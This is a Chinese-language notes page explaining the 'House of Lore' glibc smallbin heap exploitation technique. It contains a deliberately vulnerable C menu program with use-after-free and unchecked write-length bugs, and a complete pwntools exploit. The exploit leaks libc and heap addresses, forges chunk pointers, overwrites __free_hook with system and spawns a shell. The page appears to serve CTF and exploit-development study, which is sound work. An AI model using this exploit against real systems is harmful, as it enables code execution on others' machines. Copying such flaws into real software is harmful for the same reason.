<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># House of Lore,House of Lore</title>
    <link rel="stylesheet" href="../../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>House of Lore</h1>
<h2>1.基本原理</h2>
<p>与 smallbin 紧密相关，利用的前提是需要控制 smallbin 的 bk 指针，并且控制指定位置 chunk 的 fd 指针，可以实现任意地址 malloc，从而实现任意地址写</p>
<p>影响的 glibc 版本：小于 glibc—2.31</p>
<p>构造流程：</p>
<ul>
<li>
<p>申请 smallbin 范围大小的 chunk1（64 位：0x20-0x3f0）</p>
</li>
<li>
<p>申请一个 chunk 防止 free 时 chunk1 与 topchunk 合并</p>
</li>
<li>
<p>释放 chunk1 进入 unsortedbin</p>
</li>
<li>
<p>申请一个更大的内存使 chunk1 进入 smallbin，此时状态如下：</p>
<p><img src="/0101/PWN/堆利用/House/assets/7.House_of_Lore/image-20250414235050944.png" alt="image-20250414235050944"></p>
</li>
<li>
<p>绕过如下检查，victim即原本smallbin中的chunk，bck即伪造的chunk，再申请两次即可得到buf1处的chunk（第一次申请出smallbin中的victim，第二次申请出buf1，需要指定buf1的bk是因为第二次申请时会将bck=victim-&gt;bk,后面又会对bck的fd赋值，所以需要确保buf2处可写）</p>
<pre><code class="language-c">if (in_smallbin_range (nb))
{
  idx = smallbin_index (nb);
  bin = bin_at (av, idx);

  if ((victim = last (bin)) != bin)
    {
      bck = victim-&gt;bk;
      if (__glibc_unlikely (bck-&gt;fd != victim))
        malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);
      set_inuse_bit_at_offset (victim, nb);
      bin-&gt;bk = bck;
      bck-&gt;fd = bin;
</code></pre>
<p><img src="/0101/PWN/堆利用/House/assets/7.House_of_Lore/image-20250415004420124.png" alt="image-20250415004420124"></p>
</li>
</ul>
<h2>2.利用思路</h2>
<p>实例程序：</p>
<pre><code class="language-c">#include&lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;malloc.h&gt;

char buf[sizeof(size_t) * 3];
char *chunk_list[0x100];

void menu() {
    puts(&quot;1. add chunk&quot;);
    puts(&quot;2. delete chunk&quot;);
    puts(&quot;3. edit chunk&quot;);
    puts(&quot;4. show chunk&quot;);
    puts(&quot;5. edit buf&quot;);
    puts(&quot;6. edit&quot;);
    puts(&quot;choice:&quot;);
}

size_t get_num() {
    size_t num;
    scanf(&quot;%llu&quot;, &amp;num);
    return num;
}

void add_chunk() {
    puts(&quot;index:&quot;);
    size_t index = get_num();
    puts(&quot;size:&quot;);
    size_t size = get_num();
    chunk_list[index] = malloc(size);
}

void delete_chunk() {
    puts(&quot;index:&quot;);
    size_t index = get_num();
    free(chunk_list[index]);
}

void edit_chunk() {
    puts(&quot;index:&quot;);
    size_t index = get_num();
    puts(&quot;length:&quot;);
    size_t length = get_num();
    puts(&quot;content:&quot;);
    read(0, chunk_list[index], length);
}

void show_chunk() {
    puts(&quot;index:&quot;);
    size_t index = get_num();
    puts(chunk_list[index]);
}

void edit_buf() {
    puts(&quot;content:&quot;);
    read(0, buf, sizeof(buf));
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        menu();
        switch (get_num()) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                edit_chunk();
                break;
            case 4:
                show_chunk();
                break;
            case 5:
                edit_buf();
                break;
            default:
                puts(&quot;invalid choice.&quot;);
        }
    }
}
</code></pre>
<p>exp：</p>
<pre><code class="language-python">from pwn import *

elf_path = './pwn'
libc_path = './libc.so.6'
elf = ELF(elf_path, checksec=False)
libc = ELF(libc_path)
context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)
# context.terminal = ['tmux','splitw','-h']
ip = '8.147.135.93'
port = 37051

local = 1
if local:
    p = process([elf_path])
else:
    p = remote(ip, port)

# -----------------------------------------------------------------------------------------
it = lambda: p.interactive()
sd = lambda data: p.send((data))
sa = lambda delim, data: p.sendafter((delim), (data))
sl = lambda data: p.sendline((data))
sla = lambda delim, data: p.sendlineafter((delim), (data))
r = lambda numb=4096: p.recv(numb)
ru = lambda delims, drop=False: p.recvuntil(delims, drop)
rl = lambda: p.recvline()
l = lambda str1: log.success(str1)
li = lambda str1, data1: log.success(str1 + ' ========&gt; ' + hex(data1))
uu32 = lambda data: u32(data.ljust(4, b&quot;\x00&quot;))
uu64 = lambda data: u64(data.ljust(8, b&quot;\x00&quot;))
n64 = lambda x: (x + 0x10000000000000000) &amp; 0xFFFFFFFFFFFFFFFF
u32Leakbase = lambda offset: u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
u64Leakbase = lambda offset: u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset


def add_chunk(index, size):
    sla(b&quot;choice:\n&quot;, b&quot;1&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;size:\n&quot;, str(size).encode())


def delete_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;2&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())


def edit_chunk(index, content):
    sla(b&quot;choice:\n&quot;, b&quot;3&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;length:\n&quot;, str(len(content)).encode())
    sa(b&quot;content:\n&quot;, content)


def show_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;4&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())


def edit_buf(content):
    sla(b&quot;choice:\n&quot;, b'5')
    sla(b&quot;content:\n&quot;, content)

add_chunk(0, 0x200)
add_chunk(1, 0x18)
add_chunk(2, 0x200)
add_chunk(3, 0x18)

delete_chunk(0)
show_chunk(0)
libc.address = u64Leakbase(0x39bb78)
li(&quot;libc.address&quot;, libc.address)

delete_chunk(2)
edit_chunk(0, 8*b'a')
show_chunk(0)
heap_base = u64(rl()[8:12].ljust(8, b'\x00')) &amp; ~0xfff
li(&quot;heap_base&quot;, heap_base)

edit_chunk(0, p64(libc.address+0x39bb78))
add_chunk(0, 0x200)

add_chunk(10, 0x500)
edit_chunk(2, p64(0)+p64(elf.sym['buf']-0x8))
edit_buf(p64(elf.sym['buf'] - 0x8) + p64(heap_base + 0x230) + p64(elf.sym['buf'] - 0x10))
add_chunk(0, 0x200)
add_chunk(0, 0x200)

edit_chunk(0, p64(0) * 3 + p64(libc.sym['__free_hook']) + p64(next(libc.search(b'/bin/sh\x00'))))
edit_chunk(0, p64(libc.sym['system']))
delete_chunk(1)

gdb.attach(p)
pause()

it()
</code></pre>
<p>由于buf和chunk_list相邻，所以申请出buf的空间可以对chunklist进行修改，从而打hook system</p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../../assets/js/header.js"></script>
    <script src="../../../../assets/js/include-header.js"></script>
</body>
</html>